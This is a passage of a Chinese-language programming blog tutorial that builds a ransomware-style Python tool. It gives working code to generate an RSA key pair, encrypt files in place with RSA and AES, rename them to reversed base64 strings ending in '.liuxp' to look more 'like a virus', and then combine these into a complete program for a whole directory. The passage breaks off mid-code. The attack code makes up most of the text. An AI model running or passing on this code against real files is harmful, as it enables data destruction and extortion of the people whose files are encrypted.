class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def CreateRSAKeys():</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 生成 2048 位的 RSA 密钥</span></span><br><span class=\"line\">    key = RSA.generate(2048)</span><br><span class=\"line\">    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=<span class=\"string\">&quot;scryptAndAES128-CBC&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 生成私钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(encrypted_key)</span><br><span class=\"line\">    <span class=\"comment\"># 生成公钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(key.publickey().exportKey())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">CreateRSAKeys()</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>当我们执行CreateRSAKeys()后，会在当前目录生成公钥和私钥，我们打开看看。</p>\n<p>公钥：</p>\n<figure class=\"highlight bash\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN PUBLIC KEY-----</span><br><span class=\"line\">MIIBIjANBgkqhkiG9w0BAQEFAAOCAQ8AMIIBCgKCAQEA0j/abkXy6WLfwkacyKK3</span><br><span class=\"line\">40Sk0dQkODmb6ej5sffzkfgSDOd18drt6vWuqzcH0dtBHcbr8a35K8mLr9WwdKYC</span><br><span class=\"line\">hDj/dMQm+lOApmLmGeSwjoFB5Nj/tboBPRvPO0erxzS0jrtMdM6KbWjQMc4dkuuq</span><br><span class=\"line\">Ic/L6/Yp5l2mq3K3rdbkbZ8cKvJb5HCUeNiwNZQMTdxFd0R0qmVzezJdunFQAOiP</span><br><span class=\"line\">G8Knod/Z1ZghETOEuM2OPXxlRs0KA9OQhMFRS6UmCRRNv29/srT/+M307W0U9GJL</span><br><span class=\"line\">3Eobz6HqTlvl0g54Y9Dg84UO2t2VRgAZ3mlQa+bARyboOQwWpt3VZ7y44KqTwj90</span><br><span class=\"line\">UQIDAQAB</span><br><span class=\"line\">-----END PUBLIC KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>私钥：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">-----BEGIN ENCRYPTED PRIVATE KEY-----</span><br><span class=\"line\">MIIFJTBPBgkqhkiG9w0BBQ0wQjAhBgkrBgEEAdpHBAswFAQIYFPAcEnz9NUCAkAA</span><br><span class=\"line\">AgEIAgEBMB0GCWCGSAFlAwQBAgQQV9WQuQ24VS4bv3+pL+lm3ASCBNBw9SW3QVpT</span><br><span class=\"line\">IgTS6uoi7HqXmI1eJW2YTz+SxPxQbTaS0fSPG21JoumOqYIzNoQ970fefOPiwiNB</span><br><span class=\"line\">UuW46O9y/lGq3plisy9rKxmFNxjos5Dk3BBM/mOEAc5FS9i/PfKkExgCsIZ9eLpi</span><br><span class=\"line\">wYt3n1myGJifopjmbjYd6ztHs+wOfyVtid87f+gYusSXk3Ne4Yn2FXqSOL3qKBTa</span><br><span class=\"line\">PVB/Go/DfT3d50OghNC2x2WpVb69dXH68KqEIQEmCEU9QR9efOyD8DzggWMAPdAR</span><br><span class=\"line\">1qJpSGIAtAf/vFV4QG+eFtZanzg3PywoRHkEaLo5CJbQb0K/5QaLFM7SE4iHecAI</span><br><span class=\"line\">TZAepi92T1bCa0eyDUFf/RU0mgISrwzfpDzrxgnXjP3ksmLPDrCocXn2Kenvrnqv</span><br><span class=\"line\">mrHwh3d4Y8qoCGEwtPuc3t1N5nNq7cd1BWhtt1E/scAp3B4pg6f3hPuWApXKzGwK</span><br><span class=\"line\">1ru6RJrZ/yhvMTsXX7fASpKnUcJw20fOl5jqsNae0GufZnRTmEwjXzh5uyh7oKYx</span><br><span class=\"line\">ha2OycJWcaZTm6Yo6h7OfAAZfvWgT0sSg7q2Rw/v13laxAZFHlWwLek1L9vtOjXM</span><br><span class=\"line\">RU/WSJxksg42WUWlL1EOF+GYsX5hwXEGpHNLJmkbeAWblx7xYvlYkkognhbAG/Pe</span><br><span class=\"line\">2QJwbbhfFmQO3NSj8usT+3f0YpPodPXvprk6qosLnhPBjK/NYxYuI/PsRME6Jm02</span><br><span class=\"line\">vQWgSB34vPS2NtxEt2WEtRSGAgwsLPo1U8GaGLLe5DCbXUbbm01/rd24VqY4I3fk</span><br><span class=\"line\">hY8tw6V5PmBvJ3RlD4Q7xSdHTQnU05sDBg3WJ+gU4uNMYQxzs/2UxyRJfd7gHwt8</span><br><span class=\"line\">J4enD1ch0G1v5KeXRJNj2AatL8U3oSqm+4ZPzT/riRLB485yCljUwxFK18O2Rgy3</span><br><span class=\"line\">purKYfk3Vh+M4UTVdmvOlNzaY7ll/kKGAeIz1CMBiyBDm3n0GOrTUT+UtMKgib6V</span><br><span class=\"line\">XP6fVZ3A33oa2+cbaRX+4inShyNFly+FTjebHZ3qOBoKv9yJ2ZkeSwWhocpfZyG1</span><br><span class=\"line\">LBidZFC6cKlzAuOalKAnk+FpkNAms7VBppjSZUiULqOdFbiJREN8tlVumQh4rNkm</span><br><span class=\"line\">ehaHywx1KYQxhi1wKoD5eqKhgjiIdGja9ojxXbS1QMZJhz5W7/uSvfLxXQrL4F6T</span><br><span class=\"line\">ZxwdF+w85+SJQq6d4MmLjyIDbdivsNg+m1t3kiaRRcVgBotFgT0qLVdqmB/Townt</span><br><span class=\"line\">aYnDBCJ6EgnWSGwNMqMOR9wwIp9x01UbMpM8r86DDmQlLKDh+oqi4WAdYoAgAt+5</span><br><span class=\"line\">7Wwb45GsrgaX6YrQ42W364wsYsJSLkcrx2XuL221pZgm4wCxrKQ0LvpJ3zkrKLLF</span><br><span class=\"line\">IiB2UEpKG02MmBHpUktS0P9WE3uLg11LlGMAjY785EcU5is8RIiJwWmsw31mI1aV</span><br><span class=\"line\">/RXEdAk//2796uxxOjqoEYfieeIW8qlfiBRkxDRTqaFxlPqGm6HGs3xxIsKkylWX</span><br><span class=\"line\">AjvyWUObRYcu8iujiCnOpCLiYUtfkxomiw0xl6hyqyLeVe0Vf6f/cTEKYRDfUpVS</span><br><span class=\"line\">+Znqj5IfgE/7mqDl2rjH8SnsvBb2BMK/kMGjPuOIDFfbaXy+s9f9bGH6I/g2D57W</span><br><span class=\"line\">G5V6ZnooEecwqjFhZ1xHKMtvDcPAO0ivEw==</span><br><span class=\"line\">-----END ENCRYPTED PRIVATE KEY-----</span><br></pre></td></tr></table></figure>\n\n<p>当然每次运行的结果都不一定，公钥是公开的，任何人都可以看到，但是私钥一定要保存好，否则一旦泄露，意味着你的信息也不安全了。</p>\n<h3 id=\"文件加密\"><a href=\"#文件加密\" class=\"headerlink\" title=\"文件加密\"></a>文件加密</h3><p>现在我们来看看如何对文件进行加密处理：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\">from Crypto.Random import get_random_bytes</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Encrypt(filename):</span><br><span class=\"line\">    data = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    <span class=\"comment\"># 二进制只读打开文件，读取文件数据</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as f:</span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as out_file:</span><br><span class=\"line\">        <span class=\"comment\"># 收件人秘钥 - 公钥</span></span><br><span class=\"line\">        recipient_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>).<span class=\"built_in\">read</span>())</span><br><span class=\"line\">        <span class=\"comment\"># 一个 16 字节的会话密钥</span></span><br><span class=\"line\">        session_key = get_random_bytes(16)</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the session key with the public RSA key</span></span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</span><br><span class=\"line\">        out_file.write(cipher_rsa.encrypt(session_key))</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the data with the AES session key</span></span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</span><br><span class=\"line\"></span><br><span class=\"line\">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class=\"line\">        out_file.write(cipher_aes.nonce)</span><br><span class=\"line\">        out_file.write(tag)</span><br><span class=\"line\">        out_file.write(ciphertext)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Encrypt(<span class=\"string\">&quot;e://test/music.mp3&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们打开一个文件用于写入数据。接着我们导入公钥赋给一个变量，创建一个 16 字节的会话密钥。在这个例子中，我们将使用混合加密方法，即 PKCS#1 OAEP ，也就是最优非对称加密填充。这允许我们向文件中写入任意长度的数据。接着我们创建 AES 加密，要加密的数据，然后加密数据。我们将得到加密的文本和消息认证码。最后，我们将随机数，消息认证码和加密的文本写入文件。</p>\n<p>加密后，这个时候你肯定没有办法按照原来的方式打开你的文件了，或者你能打开，显示的也是乱码。</p>\n<h3 id=\"私钥解密\"><a href=\"#私钥解密\" class=\"headerlink\" title=\"私钥解密\"></a>私钥解密</h3><figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Descrypt(filename):</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as fobj:</span><br><span class=\"line\">        <span class=\"comment\"># 导入私钥</span></span><br><span class=\"line\">        private_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>).<span class=\"built_in\">read</span>(), passphrase=code)</span><br><span class=\"line\">        <span class=\"comment\"># 会话密钥， 随机数，消息认证码，机密的数据</span></span><br><span class=\"line\">        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)</span><br><span class=\"line\">                                                   <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> (private_key.size_in_bytes(),</span><br><span class=\"line\">                                                             16, 16, -1)]</span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(private_key)</span><br><span class=\"line\">        session_key = cipher_rsa.decrypt(enc_session_key)</span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</span><br><span class=\"line\">        <span class=\"comment\"># 解密</span></span><br><span class=\"line\">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</span><br><span class=\"line\"></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as wobj:</span><br><span class=\"line\">        wobj.write(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">Descrypt(<span class=\"string\">&quot;e://test/music.mp3&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>我们先以二进制模式读取我们的加密文件，然后导入私钥。注意，当你导私钥时，需要提供一个密码，否则会出现错误。然后，我们文件中读取数据，首先是加密的会话密钥，然后是 16 字节的随机数和 16 字节的消息认证码，最后是剩下的加密的数据。</p>\n<p>接下来我们需要解密出会话密钥，重新创建 AES 密钥，然后解密出数据。</p>\n<p>解密完成后，我们会发现刚刚打不开或者无法正确显示的文件，又恢复正常了！</p>\n<h3 id=\"变更文件名\"><a href=\"#变更文件名\" class=\"headerlink\" title=\"变更文件名\"></a>变更文件名</h3><p>当然至此，文件加密的部分已经完成，但是为了使这个更像病毒，我们可以模拟hacker的做法，直接把整个文件的后缀名改掉，或者更混蛋一点，我就是想搞破坏，直接把文件名字改成一串没有意义的数值：</p>\n<p>举例比如：blog2.rar &#x3D;&#x3D;&gt; yFmcuIzZvxmY.liuxp</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def RenameFile(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    filename_bytes = filename.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    filename_bytes_base64 = base64.encodebytes(filename_bytes)</span><br><span class=\"line\"></span><br><span class=\"line\">    filename_bytes_base64 = filename_bytes_base64[::-1][1:]  <span class=\"comment\"># 倒序</span></span><br><span class=\"line\">    new_filename = filename_bytes_base64.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>) + <span class=\"string\">&#x27;.liuxp&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print (new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, filename))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, filename), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RenameFile(<span class=\"string\">&quot;e:/test/&quot;</span>, <span class=\"string\">&quot;cool.png&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用了base64对文件名进行编码。</p>\n<h3 id=\"恢复文件名\"><a href=\"#恢复文件名\" class=\"headerlink\" title=\"恢复文件名\"></a>恢复文件名</h3><p>举例比如: yFmcuIzZvxmY.liuxp &#x3D;&#x3D;&gt; blog2.rar</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">import os</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def RestoreFilename(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    f = filename</span><br><span class=\"line\">    filename = filename[::-1][6:][::-1]</span><br><span class=\"line\">    filename_base64 = filename[::-1] + <span class=\"string\">&#x27;\\n&#x27;</span></span><br><span class=\"line\">    filename_bytes_base64 = filename_base64.encode(<span class=\"string\">&#x27;ascii&#x27;</span>)  <span class=\"comment\"># encode as ASCII</span></span><br><span class=\"line\">    ori_filename = base64.decodebytes(filename_bytes_base64).decode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    new_filename = ori_filename</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print(new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, f))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, f), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">RestoreFilename(<span class=\"string\">&quot;e://test/&quot;</span>, <span class=\"string\">&quot;0hHdu8GbsVGa.liuxp&quot;</span>)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n\n<p>使用了base64对文件进行解码。</p>\n<h3 id=\"完整源码\"><a href=\"#完整源码\" class=\"headerlink\" title=\"完整源码\"></a>完整源码</h3><p>我们把上述几个过程整合起来，然后实现对某一个目录下的所有文件进行不对称加密和不对称解密：</p>\n<figure class=\"highlight bash\"><figcaption><span>折叠代码</span></figcaption><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br><span class=\"line\">60</span><br><span class=\"line\">61</span><br><span class=\"line\">62</span><br><span class=\"line\">63</span><br><span class=\"line\">64</span><br><span class=\"line\">65</span><br><span class=\"line\">66</span><br><span class=\"line\">67</span><br><span class=\"line\">68</span><br><span class=\"line\">69</span><br><span class=\"line\">70</span><br><span class=\"line\">71</span><br><span class=\"line\">72</span><br><span class=\"line\">73</span><br><span class=\"line\">74</span><br><span class=\"line\">75</span><br><span class=\"line\">76</span><br><span class=\"line\">77</span><br><span class=\"line\">78</span><br><span class=\"line\">79</span><br><span class=\"line\">80</span><br><span class=\"line\">81</span><br><span class=\"line\">82</span><br><span class=\"line\">83</span><br><span class=\"line\">84</span><br><span class=\"line\">85</span><br><span class=\"line\">86</span><br><span class=\"line\">87</span><br><span class=\"line\">88</span><br><span class=\"line\">89</span><br><span class=\"line\">90</span><br><span class=\"line\">91</span><br><span class=\"line\">92</span><br><span class=\"line\">93</span><br><span class=\"line\">94</span><br><span class=\"line\">95</span><br><span class=\"line\">96</span><br><span class=\"line\">97</span><br><span class=\"line\">98</span><br><span class=\"line\">99</span><br><span class=\"line\">100</span><br><span class=\"line\">101</span><br><span class=\"line\">102</span><br><span class=\"line\">103</span><br><span class=\"line\">104</span><br><span class=\"line\">105</span><br><span class=\"line\">106</span><br><span class=\"line\">107</span><br><span class=\"line\">108</span><br><span class=\"line\">109</span><br><span class=\"line\">110</span><br><span class=\"line\">111</span><br><span class=\"line\">112</span><br><span class=\"line\">113</span><br><span class=\"line\">114</span><br><span class=\"line\">115</span><br><span class=\"line\">116</span><br><span class=\"line\">117</span><br><span class=\"line\">118</span><br><span class=\"line\">119</span><br><span class=\"line\">120</span><br><span class=\"line\">121</span><br><span class=\"line\">122</span><br><span class=\"line\">123</span><br><span class=\"line\">124</span><br><span class=\"line\">125</span><br><span class=\"line\">126</span><br><span class=\"line\">127</span><br><span class=\"line\">128</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"comment\"># coding=utf-8</span></span><br><span class=\"line\">from Crypto.PublicKey import RSA</span><br><span class=\"line\">from Crypto.Random import get_random_bytes</span><br><span class=\"line\">from Crypto.Cipher import AES, PKCS1_OAEP</span><br><span class=\"line\">import os</span><br><span class=\"line\">import <span class=\"built_in\">base64</span></span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def CreateRSAKeys():</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    key = RSA.generate(2048)</span><br><span class=\"line\">    encrypted_key = key.exportKey(passphrase=code, pkcs=8, protection=<span class=\"string\">&quot;scryptAndAES128-CBC&quot;</span>)</span><br><span class=\"line\">    <span class=\"comment\"># 私钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(encrypted_key)</span><br><span class=\"line\">    <span class=\"comment\"># 公钥</span></span><br><span class=\"line\">    with open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>, <span class=\"string\">&#x27;wb&#x27;</span>) as f:</span><br><span class=\"line\">        f.write(key.publickey().exportKey())</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Encrypt(filename):</span><br><span class=\"line\">    data = <span class=\"string\">&#x27;&#x27;</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as f:</span><br><span class=\"line\">        data = f.read()</span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as out_file:</span><br><span class=\"line\">        <span class=\"comment\"># 收件人秘钥 - 公钥</span></span><br><span class=\"line\">        recipient_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa.pub&#x27;</span>).<span class=\"built_in\">read</span>())</span><br><span class=\"line\">        session_key = get_random_bytes(16)</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the session key with the public RSA key</span></span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(recipient_key)</span><br><span class=\"line\">        out_file.write(cipher_rsa.encrypt(session_key))</span><br><span class=\"line\">        <span class=\"comment\"># Encrypt the data with the AES session key</span></span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX)</span><br><span class=\"line\">        ciphertext, tag = cipher_aes.encrypt_and_digest(data)</span><br><span class=\"line\">        out_file.write(cipher_aes.nonce)</span><br><span class=\"line\">        out_file.write(tag)</span><br><span class=\"line\">        out_file.write(ciphertext)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def Descrypt(filename):</span><br><span class=\"line\">    code = <span class=\"string\">&#x27;nooneknows&#x27;</span></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;rb&#x27;</span>) as fobj:</span><br><span class=\"line\">        <span class=\"comment\"># 导入私钥</span></span><br><span class=\"line\">        private_key = RSA.import_key(open(<span class=\"string\">&#x27;zmy_rsa&#x27;</span>).<span class=\"built_in\">read</span>(), passphrase=code)</span><br><span class=\"line\">        <span class=\"comment\"># 会话密钥， 随机数，消息认证码，机密的数据</span></span><br><span class=\"line\">        enc_session_key, nonce, tag, ciphertext = [fobj.read(x)</span><br><span class=\"line\">                                                   <span class=\"keyword\">for</span> x <span class=\"keyword\">in</span> (private_key.size_in_bytes(),</span><br><span class=\"line\">                                                             16, 16, -1)]</span><br><span class=\"line\">        cipher_rsa = PKCS1_OAEP.new(private_key)</span><br><span class=\"line\">        session_key = cipher_rsa.decrypt(enc_session_key)</span><br><span class=\"line\">        cipher_aes = AES.new(session_key, AES.MODE_EAX, nonce)</span><br><span class=\"line\">        <span class=\"comment\"># 解密</span></span><br><span class=\"line\">        data = cipher_aes.decrypt_and_verify(ciphertext, tag)</span><br><span class=\"line\"></span><br><span class=\"line\">    with open(filename, <span class=\"string\">&#x27;wb&#x27;</span>) as wobj:</span><br><span class=\"line\">        wobj.write(data)</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def RenameFile(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    filename_bytes = filename.encode(<span class=\"string\">&#x27;utf-8&#x27;</span>)</span><br><span class=\"line\">    filename_bytes_base64 = base64.encodebytes(filename_bytes)</span><br><span class=\"line\"></span><br><span class=\"line\">    filename_bytes_base64 = filename_bytes_base64[::-1][1:]</span><br><span class=\"line\">    new_filename = filename_bytes_base64.decode(<span class=\"string\">&#x27;utf-8&#x27;</span>) + <span class=\"string\">&#x27;.liuxp&#x27;</span></span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"comment\"># print (new_filename)</span></span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, filename))</span><br><span class=\"line\">    <span class=\"built_in\">print</span>(os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\">    os.rename(os.path.join(<span class=\"built_in\">dir</span>, filename), os.path.join(<span class=\"built_in\">dir</span>, new_filename))</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">def ReserveFilename(<span class=\"built_in\">dir</span>, filename):</span><br><span class=\"line\">    f = filename</span><br><span class=\"line\">    filename = 